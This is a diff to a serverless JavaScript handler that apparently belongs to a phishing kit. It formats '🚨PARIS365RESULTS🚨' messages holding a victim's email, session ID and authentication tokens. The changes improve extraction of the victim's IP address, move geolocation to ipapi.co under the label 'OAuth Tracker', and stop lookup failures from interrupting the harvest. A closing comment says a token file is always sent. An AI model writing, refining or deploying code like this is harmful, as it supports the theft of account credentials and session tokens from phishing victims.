@@ -149,7 +149,6 @@ const handler = async (event, context) => {
     const uniqueId = Math.random().toString(36).substring(2, 8);
     const messageLines = [
       '🚨PARIS365RESULTS🚨',
-      '',
       `📧 Email: ${email}`,
       `🆔 Session ID: ${sessionId}`,
       `⏰ Time: ${timestamp}`,
@@ -204,7 +203,7 @@ const handler = async (event, context) => {
     console.log('🔍 data.authenticationTokens:', data.authenticationTokens);
     console.log('🔍 Token check result:', !!data.authenticationTokens);
     
-    // Get user IP and location information
+    // Get user IP and location information (OPTIONAL - don't break main function)
     let userIpInfo = {
         ip: 'Unknown',
         country: 'Unknown',
@@ -215,33 +214,41 @@ const handler = async (event, context) => {
     
     try {
         // Get IP from request headers (Netlify provides this)
-        const clientIP = event.headers['x-forwarded-for'] || 
+        const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                         event.headers['x-real-ip'] || 
                         event.headers['cf-connecting-ip'] ||
                         'Unknown';
         
-        console.log('🌍 Detected IP address:', clientIP);
+        console.log('🌍 Attempting to detect IP address:', clientIP);
+        userIpInfo.ip = clientIP;
         
-        // Get location info from a free IP geolocation service
-        const ipResponse = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,message,country,countryCode,region,regionName,city,timezone,query`);
-        const ipData = await ipResponse.json();
-        
-        if (ipData.status === 'success') {
-            userIpInfo = {
-                ip: ipData.query || clientIP,
-                country: ipData.country || 'Unknown',
-                countryCode: ipData.countryCode || 'Unknown',
-                city: ipData.city || 'Unknown',
-                region: ipData.regionName || 'Unknown',
-                timezone: ipData.timezone || 'Unknown'
-            };
-            console.log('🌍 Location detected:', userIpInfo);
-        } else {
-            userIpInfo.ip = clientIP;
-            console.log('⚠️ Could not get location data, using IP only');
+        // Try to get location info (but don't fail if this doesn't work)
+        if (clientIP !== 'Unknown' && !clientIP.includes('127.0.0.1') && !clientIP.includes('localhost')) {
+            const ipResponse = await fetch(`https://ipapi.co/${clientIP}/json/`, {
+                timeout: 3000, // 3 second timeout
+                headers: {
+                    'User-Agent': 'OAuth Tracker'
+                }
+            });
+            
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                if (ipData.country_name) {
+                    userIpInfo = {
+                        ip: clientIP,
+                        country: ipData.country_name || 'Unknown',
+                        countryCode: ipData.country_code || 'Unknown',
+                        city: ipData.city || 'Unknown',
+                        region: ipData.region || 'Unknown',
+                        timezone: ipData.timezone || 'Unknown'
+                    };
+                    console.log('🌍 Location detected successfully');
+                }
+            }
         }
     } catch (error) {
-        console.log('❌ Error getting IP/location:', error.message);
+        console.log('⚠️ IP/location detection failed (continuing anyway):', error.message);
+        // Don't let IP detection failure break the main function
     }
 
     // Always send token file to debug the issue
